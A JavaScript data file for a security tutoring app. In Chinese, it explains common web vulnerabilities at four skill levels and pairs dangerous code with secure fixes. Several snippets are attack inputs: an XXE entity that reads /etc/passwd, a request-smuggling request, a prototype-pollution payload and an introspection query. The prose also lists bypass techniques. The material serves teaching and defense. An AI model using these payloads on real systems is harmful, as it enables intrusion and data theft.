/* ============================================================
   SecTutor 数据层
   - categories: 四大领域分级知识（入门/初级/中级/高级）
   - ranges:     实战靶场题目 + 解析（侧重本地授权环境）
   - news:       已公开且已修复历史漏洞的教育性解读（防御视角）
   - tools:      安全工具使用说明 + 合规提示
   全部内容仅用于合法授权的安全学习与防御研究。
   ============================================================ */

const SEC_DATA = {
  categories: [
    /* ---------------- Web 安全 ---------------- */
    {
      id: "web", name: "Web 安全", icon: "🌐",
      desc: "Web 应用是当下最常见的攻击面，本模块覆盖服务端/客户端主流漏洞原理与防御。",
      topics: [
        {
          id: "sqli", name: "SQL 注入", level: "初级",
          summary: "攻击者将恶意 SQL 拼接到查询中，绕过逻辑或窃取/篡改数据。",
          keywords: ["sql注入","sql injection","sqli","sql 注入","union","盲注","报错注入","堆叠注入","预处理"],
          levels: {
            "入门": "网站把用户输入直接拼进数据库查询语句。例如登录时把用户名、密码拼成一条 SQL，攻击者输入特殊字符就能改变这条语句的本意，从而绕过登录或读取别人数据。这是 OWASP Top 10 常年榜首问题之一。",
            "初级": "核心是「数据与指令未分离」。当 <code class='inline-code'>\"SELECT * FROM users WHERE name='\"+input+\"'\"</code> 中的 input 含单引号与注释符时，SQL 结构被改变。常见类型：Union 注入（直接回显数据）、报错注入（利用数据库报错带出数据）、布尔/时间盲注（无回显时靠真假/延迟判断）。",
            "中级": "实战关注点：1) 识别注入点（参数、Header、Cookie）；2) 绕过 WAF（内联注释、编码、分块）；3) 利用 <code class='inline-code'>information_schema</code> 枚举库表；4) 盲注脚本化（Python + requests）。防御首选参数化查询（预处理语句），其次是输入白名单与最小权限账号。",
            "高级": "深入二次注入、堆叠查询、宽字节注入（GBK 转义绕过）、ORM 层面的对象注入、以及云数据库（如 MongoDB NoSQL 注入）。理解预处理器在驱动层的真正行为（占位符与转义时机），并能审计框架（MyBatis ${} 误用、Hibernate 拼接）导致的注入。"
          },
          codeLang: "python",
          code:
`# ❌ 危险：字符串拼接（示例仅用于教学，请勿用于非授权目标）
sql = "SELECT * FROM users WHERE name='" + username + "'"

# ✅ 安全：参数化查询（预处理语句）
import sqlite3
cur = conn.cursor()
cur.execute("SELECT * FROM users WHERE name=?", (username,))
# 或使用 ORM 的占位符，绝不拼接用户输入`,
          tool: "sqlmap（仅用于你拥有授权的目标/靶场）、Burp Suite",
          refs: "OWASP SQL Injection Cheat Sheet；PortSwigger Web Security Academy"
        },
        {
          id: "xss", name: "跨站脚本 XSS", level: "初级",
          summary: "在网页中注入恶意脚本，在受害者浏览器中执行，窃取会话或钓鱼。",
          keywords: ["xss","跨站脚本","cross site scripting","存储型","反射型","dom型","dom xss","csp","htmlspecialchars"],
          levels: {
            "入门": "网站把你输入的内容原样显示到页面上。如果你输入一段 JavaScript，别的用户打开页面时这段脚本就会在他的浏览器里运行，能偷走他的登录凭证（Cookie）或伪造操作。分为「存储型」（存到数据库，危害大）和「反射型」（藏在链接里骗人点）。",
            "初级": "三类：反射型（参数回显）、存储型（入库后展示）、DOM 型（前端 JS 操作 DOM 导致，不经过服务器）。危害取决于能拿到的上下文：窃取 Cookie、绕过 CSRF 防护、钓鱼、甚至组合 RCE（在管理后台）。防御：输出编码（HTML/JS/URL 上下文分别处理）+ 内容安全策略 CSP。",
            "中级": "绕过技巧：标签/事件处理器变种、<code class='inline-code'>&lt;svg onload&gt;</code>、字符编码绕过、CSP 绕过（jsonp、unsafe-inline 残留）。实战用 XSS 平台（如自搭）收 Cookie，配合同源策略理解。注意：现代框架（React/Vue）默认转义，风险转移到 dangerouslySetInnerHTML / v-html 等误用。",
            "高级": "深入 CSP 严格模式绕过、基于 XSS 的账号接管链路、mutiation XSS（DOM 净化后再次污染）、以及浏览器引擎层面的利用（UXSS）。强调：XSS 是客户端漏洞，修复必须在输出编码与信任边界上做文章，而非仅依赖输入过滤。"
          },
          codeLang: "javascript",
          code:
`// ❌ 危险：把用户输入直接插入 DOM
element.innerHTML = userInput;

// ✅ 安全：使用 textContent（自动编码）
element.textContent = userInput;

// ✅ 服务端输出编码（Node/Express 示例）
const escapeHtml = s => s.replace(/[&<>"']/g, c =>
  ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));`,
          tool: "Burp Suite、浏览器开发者工具、XSS 练习靶场（如 DVWA、Portswigger Labs）",
          refs: "OWASP XSS Prevention Cheat Sheet；MDN CSP 文档"
        },
        {
          id: "csrf", name: "跨站请求伪造 CSRF", level: "入门",
          summary: "诱骗已登录用户在不知情时发出非本意请求（转账、改密等）。",
          keywords: ["csrf","跨站请求伪造","cross site request forgery","xsrf","令牌","token","sameSite","表单防护"],
          levels: {
            "入门": "你登录了银行网站，然后又打开了一个恶意网页。这个网页偷偷向银行发了一个「转账」请求，因为你的浏览器还带着登录凭证，银行就执行了。防御办法是给每个重要操作加一个只有你自己知道的「令牌」。",
            "初级": "CSRF 利用的是「浏览器自动携带凭证（Cookie）」的特性。防御三板斧：1) 同步器令牌（Anti-CSRF Token）；2) SameSite Cookie 属性（Strict/Lax 阻止跨站携带）；3) 关键操作二次验证/验证码。注意 GET 请求绝不能做状态变更。",
            "中级": "结合 XSS 时 CSRF 令牌可能失效（同域可读取），所以要「XSS 与 CSRF 联防」。REST API 常用自定义请求头（如 X-Requested-With）+ CORS 校验。审计重点：是否存在可预测的状态变更接口、令牌是否可重用。",
            "高级": "深入探讨双重提交 Cookie 模式、令牌的机密性与绑定（用户/会话）、以及在现代无 Cookie 认证（JWT 存 localStorage）场景下 CSRF 模型的变迁。明确：CSRF 并非万能，防御需与认证设计协同。"
          },
          codeLang: "html",
          code:
`<!-- ✅ 服务端在表单中下发一次性令牌 -->
<form action="/transfer" method="POST">
  <input type="hidden" name="csrf_token" value="<%= token %>" />
  <input name="amount" />
</form>

<!-- ✅ 为认证 Cookie 设置 SameSite -->
Set-Cookie: session=...; SameSite=Lax; HttpOnly; Secure`,
          tool: "Burp Suite（生成 CSRF PoC）、自研测试页",
          refs: "OWASP CSRF Prevention Cheat Sheet"
        },
        {
          id: "ssrf", name: "服务端请求伪造 SSRF", level: "中级",
          summary: "诱使服务器代替攻击者向内网/云元数据等发起请求。",
          keywords: ["ssrf","服务端请求伪造","server side request forgery","内网","metadata","169.254.169.254","gopher","云安全"],
          levels: {
            "入门": "有些网站会「帮你去取一个网址的内容」。如果你能控制这个网址，就能让它去访问本来你访问不到的内部地址（比如公司内网、云服务器的管理接口），造成信息泄露。",
            "初级": "典型入口：URL 预览、图片抓取、Webhook、PDF 生成（引用外部资源）。危害：探测内网、攻击内部服务、读取云元数据（AWS/GCP 的 169.254.169.254 可能泄露临时凭证）。绕过：IP 编码（十进制/十六进制）、@ 重定向、DNS 重绑定。",
            "中级": "利用链：SSRF → 访问内部 Admin API → 提权；或配合 Redis/未授权服务写计划任务。防御：白名单域名 + 解析后校验 IP 是否属于内网/保留段 + 禁止非常规协议（file/gopher）。",
            "高级": "绕过技巧深入：IPv6、十进制点分变体、URL 解析差异（不同库对 @、#、\\\\ 处理不同）、DNS rebinding（TTL=0）。云原生场景下重点防护元数据服务（IMDSv2、强制 hop limit）。"
          },
          codeLang: "python",
          code:
`# ✅ 防御：只允许访问白名单主机，并校验解析后的 IP
import ipaddress, socket
ALLOWED = {"api.trusted.com"}
def safe_fetch(url):
    host = parse_host(url)
    if host not in ALLOWED:
        raise ValueError("host not allowed")
    ip = socket.gethostbyname(host)
    if ipaddress.ip_address(ip).is_private:
        raise ValueError("private ip blocked")`,
          tool: "Burp Collaborator、内网靶机",
          refs: "OWASP SSRF 防护；云厂商 IMDSv2 文档"
        },
        {
          id: "upload", name: "文件上传漏洞", level: "初级",
          summary: "未校验上传文件导致 Webshell/恶意文件落地。",
          keywords: ["文件上传","上传漏洞","upload","webshell","content-type","后缀","黑白名单","imagecopy"],
          levels: {
            "入门": "网站让你传头像图片，但没认真检查文件是不是真图片。攻击者传一个伪装成图片的可执行脚本，再想办法访问它，就能在服务器上执行命令。",
            "初级": "风险点：后缀黑名单可被绕过（.php5、.phtml、大小写、空格点）、Content-Type 可伪造、图片马（含恶意代码的图片）。防御：白名单后缀、重命名随机化、存储到非执行目录、用 imagecreatefrom 校验真实图片。",
            "中级": "深入：二次渲染绕过（修改图片不影响恶意载荷的位置）、.htaccess 覆盖、竞争条件（先传后删）、云存储的元数据执行问题。组合文件包含（LFI）可放大危害。",
            "高级": "现代防护：对象存储（OSS/S3）分离执行与存储、预签名上传、服务端病毒扫描、WAF 文件类型深度检测。理解「上传≠执行」，关键在落地路径与解析链。"
          },
          codeLang: "php",
          code:
`// ✅ 白名单 + 重命名（示意）
$allowed = ['jpg','png','gif'];
$ext = strtolower(pathinfo($name, PATHINFO_EXTENSION));
if (!in_array($ext, $allowed)) die("非法类型");
$save = '/uploads/' . bin2hex(random_bytes(8)) . ".$ext";`,
          tool: "Burp Repeater、各类上传靶场",
          refs: "OWASP 文件上传防护"
        },
        {
          id: "cmdinj", name: "命令注入", level: "初级",
          summary: "把用户输入作为系统命令的一部分执行。",
          keywords: ["命令注入","command injection","rce","系统命令","shell","exec","反引号","&&","管道"],
          levels: {
            "入门": "程序需要调用系统命令处理你的输入，却没做隔离。你输入「正常内容 + 一个分号 + 另一条命令」，服务器就把两条都执行了，可能泄漏文件或失控。",
            "初级": "拼接 shell 的危险函数（exec/system/popen/os.system）。分隔符：; && || | 以及反引号、$()。防御：避免调用 shell；必须用则用白名单参数 + 参数数组（不经由 shell 解析）+ 严格转义（escapeshellarg）。",
            "中级": "绕过：变量扩展、换行、通配符、无回显时用带外（OOB）/时间盲注。与代码注入区别：命令注入针对 shell，代码注入针对解释器（如 eval）。",
            "高级": "深入：不同语言/平台的转义差异、盲命令注入的外带通道（DNS/HTTP）、以及如何在 CI/CD 与运维脚本中根除此类问题（用库函数替代 shell 调用）。"
          },
          codeLang: "python",
          code:
`# ❌ 危险：经 shell 拼接
os.system("ping -c1 " + user_host)

# ✅ 安全：参数列表，不经过 shell 解析
subprocess.run(["ping","-c1",user_host], check=True)

# ✅ 若必须 shell，严格转义
import shlex
subprocess.run("ping -c1 " + shlex.quote(user_host), shell=True)`,
          tool: "Burp、Commix（授权靶场）",
          refs: "OWASP Command Injection"
        },
        {
          id: "deser", name: "反序列化漏洞", level: "高级",
          summary: "不可信数据反序列化触发对象 gadget 链执行。",
          keywords: ["反序列化","序列化","deserialization","反序","php反序列化","java反序列化","gadget","fastjson","log4j","pickle"],
          levels: {
            "入门": "程序把对象「打包成文本」保存或传输，需要时再「拆包」还原。如果拆包时自动调用了某些特殊方法，而内容又是攻击者伪造的，就可能触发意外操作。",
            "初级": "Java（ObjectInputStream）、PHP（unserialize）、Python（pickle）、.NET（BinaryFormatter）各有风险点。核心是「反序列化即执行」的 magic method（如 __wakeup、readObject）。",
            "中级": "利用依赖库中的 gadget 链（ysoserial 思路）：CommonsCollections、Fastjson、Jackson 等。识别入口（Cookie、请求体、缓存）与危险类。防御：避免反序列化不可信数据，改用 JSON 等安全格式并做类型白名单。",
            "高级": "深入 gadget 链构造原理、JNDI 注入（Log4Shell 本质）、以及现代语言对不安全反序列化的默认禁用策略。强调：这是「设计层面」风险，最佳修复是协议与架构选择。"
          },
          codeLang: "python",
          code:
`# ❌ 危险：pickle 加载不可信数据会执行任意代码
import pickle
obj = pickle.loads(untrusted_bytes)

# ✅ 安全：用 json 并显式校验结构
import json, schema
data = json.loads(untrusted_text)
# 用 jsonschema 校验字段类型后再使用`,
          tool: "ysoserial（仅授权）、Burp、反序列化靶场",
          refs: "OWASP Deserialization；各语言官方安全公告"
        },
        {
          id: "auth", name: "认证与会话安全", level: "初级",
          summary: "登录、凭证、会话令牌的设计与常见缺陷。",
          keywords: ["认证","登录","会话","session","jwt","token","暴力破解","弱口令","多因素","mfa","oauth"],
          levels: {
            "入门": "网站怎么知道「你是你」？靠登录凭证和登录后发的「会话票据」。如果票据容易被猜到、或退出没真正销毁，别人就能顶替你。",
            "初级": "要点：密码加盐哈希存储（bcrypt/argon2）、防暴力破解（限流/验证码）、会话随机且 HttpOnly+Secure、退出即销毁。JWT 注意不要把密钥写死、校验算法不被降级（alg=none）。",
            "中级": "深入：OAuth2/OIDC 授权码流程陷阱、JWT 密钥泄露与爆破、会话固定、密码重置逻辑缺陷（token 可预测）、MFA 绕过。",
            "高级": "纵深防御：设备绑定、异常登录检测、密钥轮换、以及零信任下的持续认证模型。理解「认证是系统的信任根」。"
          },
          codeLang: "javascript",
          code:
`// ✅ 密码存储用自适应哈希（Node bcrypt 示例）
const bcrypt = require('bcrypt');
const hash = await bcrypt.hash(password, 12); // 校验用 compare
// ✅ 会话 Cookie 安全属性
res.cookie('sid', sid, { httpOnly:true, secure:true, sameSite:'lax' });`,
          tool: "Burp Intruder（授权暴力测试）、JWT 调试工具",
          refs: "OWASP Authentication Cheat Sheet"
        },
        {
          id: "xxe", name: "XML 外部实体注入 XXE", level: "中级",
          summary: "利用 XML 解析器对外部实体的支持，读取本地文件或发起 SSRF。",
          keywords: ["xxe","xml外部实体","外部实体","xml注入","外部实体注入","xxe注入","document()","system实体","盲注xxe"],
          levels: {
            "入门": "很多系统用 XML 传数据。如果解析器开启了「外部实体」，攻击者可以在 XML 里引用一个外部文件（如 /etc/passwd），服务器就会把文件内容读出来返回。更危险时还能用它访问内网。",
            "初级": "核心是 <code class='inline-code'>&lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\"&gt;</code> 在 DTD 中定义外部实体，再在数据中输出 &amp;xxe;。blind XXE 用参数实体把文件内容带外（OOB）发到攻击者服务器。防御：禁用外部实体解析、禁用 DOCTYPE。",
            "中级": "利用：读本地文件、SSRF（SYSTEM 指向内网 URL）、blind XXE 参数实体带外。绕过：CDATA 拼接、UTF-7、报错带出。审计：Content-Type 为 XML 的接口、SOAP 等旧服务。",
            "高级": "深入 XXE 在 PDF/Office（含 XML 的文档格式）中的利用、错误回显的精细构造，以及与 SSRF 组合打内网。现代框架默认禁外部实体，但遗留 XML 处理（旧 SOAP、SAML）仍是重灾区。"
          },
          codeLang: "xml",
          code:
`<!-- ❌ 危险：启用外部实体时可读取服务器文件 -->
<?xml version="1.0"?>
<!DOCTYPE r [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<user><name>&xxe;</name></user>

<!-- ✅ 安全：禁用 DTD/外部实体（以 libxml 为例） -->
$dom->loadXML($xml, LIBXML_NONET);   // 关闭外部网络实体
// 或干脆禁止 DOCTYPE：使用 XMLReader 并禁用实体`,
          tool: "XXEinjector（授权靶场）、Burp Suite、本地 XML 解析测试",
          refs: "OWASP XXE；PortSwigger XXE Academy"
        },
        {
          id: "jwt", name: "JWT 安全问题", level: "中级",
          summary: "JSON Web Token 在算法、密钥、声明上的常见实现缺陷导致越权。",
          keywords: ["jwt","json web token","alg none","jwt攻击","签名绕过","令牌伪造","jwt破解","hs256","令牌"],
          levels: {
            "入门": "JWT 是一种带签名的登录票据，分三段（头.负载.签名）。如果服务端校验不严格，攻击者可能伪造或篡改票据冒充别人。常见坑：算法被降级、密钥太弱被爆破。",
            "初级": "三类问题：1) alg=none（服务端接受无签名令牌）；2) 把非对称算法(RS256)当成对称(HS256)用，用公钥当密钥伪造签名；3) 弱密钥被爆破（hashcat 跑 rockyou）。防御：固定算法白名单、强密钥、校验 aud/exp。",
            "中级": "利用：改 header alg 为 none、kid 路径遍历指向已知文件做密钥、jku/x5u 指向攻击者控制的密钥。配合密钥混淆攻击（RS→HS）。审计重点：算法是否攻击者可控、密钥强度。",
            "高级": "深入 JWT 库对 alg 的处理差异、kid 注入，以及把 JWT 问题与整体认证架构结合看。令牌安全取决于「签名验证不可绕过 + 密钥不可预测」。"
          },
          codeLang: "javascript",
          code:
`// ✅ 校验时显式固定算法，拒绝 none / 算法混淆
jwt.verify(token, key, { algorithms: ['HS256'] }); // 白名单，且不与 RS 混用
// ✅ 设置合理过期与受众
jwt.sign(payload, key, { algorithm:'HS256', expiresIn:'2h', audience:'api' });`,
          tool: "jwt.io、hashcat（爆破弱密钥）、JWT 调试/伪造工具（授权）",
          refs: "RFC 7519；OWASP JWT 备忘"
        },
        {
          id: "clickjack", name: "点击劫持 Clickjacking", level: "入门",
          summary: "用透明 iframe 诱骗用户点击被覆盖的敏感按钮（如关注/转账）。",
          keywords: ["点击劫持","clickjacking","frame","iframe","x-frame-options","frame-ancestors","覆盖","ui redressing"],
          levels: {
            "入门": "攻击者做一个透明网页，上面偷偷盖了一个真实的银行「确认转账」按钮。你以为在点「抽奖」，其实点在转账上。本质是网站没禁止被别人用 iframe 嵌套。",
            "初级": "防御：响应头 X-Frame-Options（DENY/SAMEORIGIN）或 CSP 的 frame-ancestors。配合 COOP/COEP 进一步加固。注意：仅前端 JS 的 frame-busting 易被绕过，必须靠响应头。",
            "中级": "绕过与组合：X-Frame-Options 与 CSP 并存时的优先级、双重嵌套、结合 CSRF 把点击变成状态变更。在 DOM XSS 与 UI 覆盖组合中危害放大。",
            "高级": "深入探讨 COOP/COEP 对跨源隔离的影响、以及 UI Redressing 在移动端的变种。点击劫持是「信任边界」问题，靠浏览器策略而非业务逻辑防御。"
          },
          codeLang: "http",
          code:
`// ✅ 服务端返回禁止被嵌套（推荐 CSP frame-ancestors）
Content-Security-Policy: frame-ancestors 'self'
// 或传统头
X-Frame-Options: DENY`,
          tool: "Burp Clickbandit、浏览器开发者工具",
          refs: "OWASP Clickjacking；MDN frame-ancestors"
        },
        {
          id: "cors", name: "CORS 跨域配置错误", level: "初级",
          summary: "跨域资源共享配置错误导致敏感数据被任意网站读取。",
          keywords: ["cors","跨域","跨域资源共享","allow-origin","origin","预检","跨域配置","access-control"],
          levels: {
            "入门": "浏览器默认不允许网页读取其他网站的数据。CORS 是「白名单」机制，告诉浏览器哪些外部站可以读。如果配置成「允许所有来源」，那任何恶意网站都能读这个接口返回的你的数据。",
            "初级": "危险配置：Access-Control-Allow-Origin: * 配合 Allow-Credentials: true（浏览器拒绝，但部分旧实现误配）、或反射请求 Origin 为允许源。防御：显式白名单来源、凭据接口绝不用 *。",
            "中级": "利用：反射 Origin 绕过白名单、null origin（sandbox iframe）、配合 XSS 读响应。审计：带 Cookie 的 API 是否校验 Origin、预检逻辑是否可被操纵。",
            "高级": "深入 CORS 与 CSRF 的边界、预检缓存（preflight cache）攻击、以及同站点/同来源模型。CORS 错误会直接泄露跨域数据，属「数据出口」风险。"
          },
          codeLang: "http",
          code:
`// ✅ 仅允许特定来源，且凭据接口不使用通配符
Access-Control-Allow-Origin: https://trusted.example.com
Access-Control-Allow-Credentials: true
// ❌ 危险：通配符 + 凭据会让任意站点读取带 Cookie 的响应
// Access-Control-Allow-Origin: *   (禁止与 credentials 同用)`,
          tool: "curl、浏览器网络面板、CORSTest",
          refs: "MDN CORS；OWASP CORS 备忘"
        },
        {
          id: "lfi", name: "路径遍历与文件包含", level: "初级",
          summary: "未限制「..」等路径符号或把用户输入当文件执行，导致任意文件读取/代码执行。",
          keywords: ["路径遍历","目录遍历","path traversal","lfi","文件包含","file inclusion","../","任意文件读取","遍历","绝对路径"],
          levels: {
            "入门": "网站有个「查看/下载文件」功能，把文件名拼进路径。如果没限制「..」这种「上级目录」符号，攻击者就能跳出本来的文件夹，去读服务器上的任意文件（如密码文件、配置文件）。",
            "初级": "两类：路径遍历（用 ../ 回退读任意文件）与文件包含（LFI 把文件当代码执行，常配合图片马/日志）。绕过：编码（%2e%2e）、双写、空字节（旧 PHP）、绝对路径。防御：白名单文件名、锁定基目录、禁止用户输入拼路径。",
            "中级": "利用：读源码找更多漏洞、配合文件上传读图片马再包含执行、日志注入（把 payload 写进 access log 再包含）、Windows 盘符与 php://filter 包装器。审计：任何拼路径的「下载/预览」接口。",
            "高级": "深入 php://filter 链（转换器错误导致 RCE）、expect:///zip:///phar:// 等危险包装器、以及 phar 反序列化结合。强调：路径校验要在「解析后的真实路径」层面做，而非字符串过滤。"
          },
          codeLang: "php",
          code:
`// ✅ 仅允许白名单文件名，且锁定在基目录内
$base = '/var/www/files/';
$name = basename($_GET['file']);              // basename 去掉路径成分
$path = realpath($base . $name);
if ($path === false || strpos($path, $base) !== 0) die("拒绝访问");
readfile($path);
// ❌ 危险：直接拼接用户输入
// readfile('/var/www/files/' . $_GET['file']);`,
          tool: "Burp Repeater、文件包含靶场（DVWA/PortSwigger）、LFI 工具（授权）",
          refs: "OWASP Path Traversal；PHP 封装器文档"
        },
        {
          id: "ssti", name: "服务端模板注入", level: "中级",
          summary: "把用户输入拼进模板源码渲染，使服务器执行模板语法（读文件/RCE）。",
          keywords: ["ssti","服务端模板注入","模板注入","template injection","jinja2","twig","freemarker","服务端模板","沙箱绕过","rce"],
          levels: {
            "入门": "很多网站用「模板引擎」拼页面。如果把用户输入直接塞进模板去渲染，攻击者就能注入模板语法，让服务器执行命令或读文件——类似「把用户输入当成了代码」。",
            "初级": "常见引擎：Jinja2（Python/Flask）、Twig（PHP）、FreeMarker（Java）。探测：输入 {{7*7}} 看是否返回 49。利用：Jinja2 用对象继承链调 __globals__/__builtins__ 执行任意函数。防御：永远只把用户输入当「数据」传入模板，绝不拼成模板源码。",
            "中级": "利用：Jinja2 沙箱绕过（attr()、取私有属性、config 对象）、Twig 的 _self.env 取过滤器、FreeMarker 的 new 实例化、盲注 SSTI（靠时间/外带）。审计：任何把用户内容拼进模板字符串的 render 调用。",
            "高级": "深入各引擎沙箱模型差异、从 SSTI 到 RCE 的稳定链、以及静态扫描（AST 层面禁止用户输入进入模板编译）。SSTI 修复靠「数据与模板分离」，与 XSS 同源不同层。"
          },
          codeLang: "python",
          code:
`# ❌ 危险：把用户输入拼进模板源码再编译
from flask import Flask, request, render_template_string
app = Flask(__name__)
@app.route("/greet")
def greet():
    name = request.args.get("name", "")
    return render_template_string("Hello " + name)   # 用户可注入 {{...}}

# ✅ 安全：模板固定，输入只作数据
TEMPLATE = "Hello {{ name }}"
@app.route("/greet2")
def greet2():
    return render_template_string(TEMPLATE, name=request.args.get("name", ""))`,
          tool: "Tplmap（授权靶场）、Burp、各引擎文档",
          refs: "PortSwigger SSTI；各模板引擎安全指南"
        },
        {
          id: "idor", name: "越权访问与逻辑漏洞", level: "初级",
          summary: "未校验「数据/功能是否属于当前用户」，导致越权读写或业务逻辑绕过。",
          keywords: ["越权","逻辑漏洞","idor","不安全直接对象引用","水平越权","垂直越权","权限","object id","遍历id","业务逻辑"],
          levels: {
            "入门": "网站用「订单号/用户ID」来定位数据，但没检查「这个数据是不是你的」。攻击者把 ID 改成别人的，就能看到或篡改别人的信息——这叫越权。",
            "初级": "两类：水平越权（访问同权限他人的数据，如改 user_id=2）与垂直越权（普通用户访问管理员功能）。根因：服务端信任客户端传的 ID/角色，未做归属校验。防御：服务端按当前登录身份取数据、敏感操作校验 ownership、角色用服务端会话而非前端字段。",
            "中级": "利用：ID 自增遍历（/api/order/1001→1002）、UUID 虽难猜但功能越权仍在、批量脚本拖库。结合响应差异判断越权是否存在。审计：所有带对象 ID 的接口、前端隐藏的管理入口。",
            "高级": "深入基于属性的访问控制（ABAC）、GraphQL 字段级越权、以及业务逻辑组合（改价、改数量、优惠券叠加）。越权是「授权」缺陷，靠「默认拒绝 + 显式授权」根治。"
          },
          codeLang: "python",
          code:
`# ✅ 服务端按当前用户身份取数据，绝不信任客户端 ID
@app.route("/api/order/<int:oid>")
def get_order(oid):
    order = Order.query.get_or_404(oid)
    if order.owner_id != current_user.id:        # 归属校验
        abort(403)
    return order.to_json()
# ❌ 危险：直接按 ID 返回，任何登录用户都能看别人订单
# return Order.query.get_or_404(oid).to_json()`,
          tool: "Burp、自写遍历脚本、越权测试清单",
          refs: "OWASP Broken Access Control；WSTG 业务逻辑"
        },
        {
          id: "api-sec", name: "现代 API 安全", level: "中级",
          summary: "REST/GraphQL/gRPC 等 API 已成为主要攻击面，常见未授权访问、越权、限流缺失与批量遍历。",
          keywords: ["api安全","api security","未授权","越权","限流","批量遍历","bola","bfla","apiauth"],
          levels: {
            "入门": "现在很多功能都通过 API（接口）提供数据。如果接口没做好权限检查，攻击者改改参数就能看到别人的数据，或没登录也能调用。",
            "初级": "OWASP API Security Top 10 重点：BOLA（对象级越权）、BFLA（功能级越权）、未受保护的管理接口、限流缺失导致的爆破或遍历、批量分配（多余字段被接收）。防御：每个对象操作都做属主校验、默认拒绝、强制限流与参数白名单。",
            "中级": "实战：遍历 ID 枚举资源（/api/order/1001 改成 1002）；修改响应或请求中的角色字段尝试提权；利用批量分配（JSON 多传 role=admin）；缺失分页限流导致数据拖库。GraphQL 还需关注内省暴露与深度查询 DoS。",
            "高级": "深入：JWT 弱密钥与算法混淆（alg:none、RS256 改 HS256）、API 网关与后端的信任边界、WebSocket 鉴权、以及聚合接口的组合越权。强调：API 安全的核心是「每个请求都显式鉴权 + 每个对象都校验归属」。"
          },
          codeLang: "json",
          code:
`// ❌ 危险：仅前端隐藏管理接口，后端未校验权限
{ "role": "user", "isAdmin": true }   // 攻击者篡改即可提权

// ✅ 安全：服务端以令牌中的主体为准，忽略客户端字段
if (!authz.can(user, "order:read", order.ownerId)) return 403;
rateLimit(user, "60/min");`,
          tool: "Postman、Burp、OWASP API Top 10 清单",
          refs: "OWASP API Security Top 10；API 安全实践指南"
        },
        {
          id: "smuggling", name: "HTTP 请求走私", level: "高级",
          summary: "利用前端代理与后端对 Content-Length/Transfer-Encoding 解析差异，在一条连接中藏入第二个请求。",
          keywords: ["请求走私","request smuggling","clte","te-te","content-length","transfer-encoding","反向代理"],
          levels: {
            "入门": "网站前面常有代理或 CDN。如果代理和后面的服务器对「请求有多长」理解不一致，攻击者就能在一个请求里夹带另一个请求，影响其他用户。",
            "初级": "核心：CL（Content-Length）与 TE（Transfer-Encoding: chunked）解析分歧。CL-TE：前端用 CL、后端用 TE；TE-TE：两端都认 TE 但其中一个被混淆。结果是前端认为请求 A 结束，后端把 A 的尾巴当作请求 B 的开头。",
            "中级": "危害：绕过安全控制、将前缀注入到其他用户的请求（网页缓存投毒、窃取 Cookie、DoS）。利用：构造含冲突头的请求，观察响应差异（Timing/Diff）。工具：Burp HTTP Smuggler、smuggler.py。",
            "高级": "深入：分块长度歧义、HTTP/2 降级走私（h2c、TE 在 h2 的处理）、以及不同服务器（Apache/Nginx/Burp）解析矩阵。防御：前后端统一使用同一解析库、禁用后端对 TE 的宽松处理、迁移到 HTTP/2 并关闭不兼容降级。"
          },
          codeLang: "http",
          code:
`POST / HTTP/1.1
Host: victim.com
Content-Length: 6
Transfer-Encoding: chunked

0

G
# 后端按 TE 解析，把 G 之后的内容当作新请求的前缀`,
          tool: "Burp Suite + HTTP Smuggler；smuggler.py",
          refs: "PortSwigger Request Smuggling；RFC 7230"
        },
        {
          id: "proto-poll", name: "原型链污染", level: "高级",
          summary: "JavaScript 中 __proto__/constructor.prototype 被未受信输入修改，导致全局对象行为被篡改甚至 RCE。",
          keywords: ["原型链污染","prototype pollution","__proto__","constructor","rce","nodejs","合并","merge"],
          levels: {
            "入门": "JavaScript 的对象有一个原型，像模板。如果程序把用户输入直接当属性名合并进对象，攻击者输入特殊名字就能改掉所有对象的模板，造成意外行为。",
            "初级": "常见入口：递归 merge/clone 函数、JSON 解析后未清洗、URL 查询参数直接赋值。攻击者在请求体里注入特殊键名就能改掉所有对象的原型，危害：篡改默认配置、绕过安全校验，特定框架下可升级为 RCE（如 child_process 参数被污染）。",
            "中级": "实战：找不安全的深拷贝或合并（lodash.merge 旧版、自定义 assign）；在 Express 等框架用 query string 污染；污染后影响后续逻辑（如 isAdmin 判断）。审计：搜索 __proto__/constructor 是否可被用户输入触及。",
            "高级": "深入：无原型对象（Object.create(null)）防御、冻结原型（Object.freeze(Object.prototype)）、以及污染到 RCE 的完整链（如模板引擎 options 被污染）。强调：根本修复是在合并前剔除 __proto__/prototype/constructor 键。"
          },
          codeLang: "javascript",
          code:
`// ❌ 危险：未过滤键名的递归合并
function merge(target, src){
  for (const k in src) target[k] = (typeof src[k]==='object') ? merge(target[k]||{}, src[k]) : src[k];
  return target;
}
merge({}, JSON.parse('{"__proto__":{"admin":true}}')); // 全局原型被污染

// ✅ 安全：剔除危险键
function safeMerge(t,s){ for(const k in s){ if(k==='__proto__'||k==='constructor'||k==='prototype') continue; /* 其余照常 */ } }`,
          tool: "Burp、Node 调试、lodash 安全版本",
          refs: "CVE-2019-10744（lodash）；Prototype Pollution 指南"
        },
        {
          id: "graphql", name: "GraphQL 安全", level: "中级",
          summary: "GraphQL 内省暴露全量 Schema，易引发信息泄露、深度查询 DoS 与字段级越权。",
          keywords: ["graphql","内省","introspection","深度查询","dos","批查询","graphql 安全","batching"],
          levels: {
            "入门": "GraphQL 让前端自己决定要哪些数据。如果开着「查自己有哪些接口」的功能，攻击者能摸清楚全部数据结构，再针对性地捞数据。",
            "初级": "风险点：内省（Introspection）在生产环境未关闭，泄露完整 Schema；深度或复杂度查询 DoS（嵌套过深拖垮服务）；批查询绕过速率限制；字段级越权（能查到别的用户的字段）。",
            "中级": "实战：用 GraphQL Voyager 或 introspection 导出 Schema；构造深层嵌套查询测超时；利用 batched requests 做批量枚举。防御：生产关闭 introspection、限制查询深度与复杂度、字段级鉴权（每个 resolver 校验归属）。",
            "高级": "深入：CSRF 下 GraphQL 的 POST 利用、GraphQL 与 REST 网关的信任边界、以及基于指令（@auth）的细粒度授权模型实现。强调：GraphQL 不会替你做鉴权，每个字段都需显式授权。"
          },
          codeLang: "graphql",
          code:
`# ❌ 危险：生产仍开放内省，且字段无鉴权
query { __schema { types { name fields { name } } } }

# ✅ 安全：限制深度 + 字段级授权（伪代码）
if (query.depth > 10) throw new Error("too deep");
# @auth(requires: owner) user(id: ID!): User  仅属主可见`,
          tool: "GraphQL Voyager、InQL（Burp 插件）、Altair",
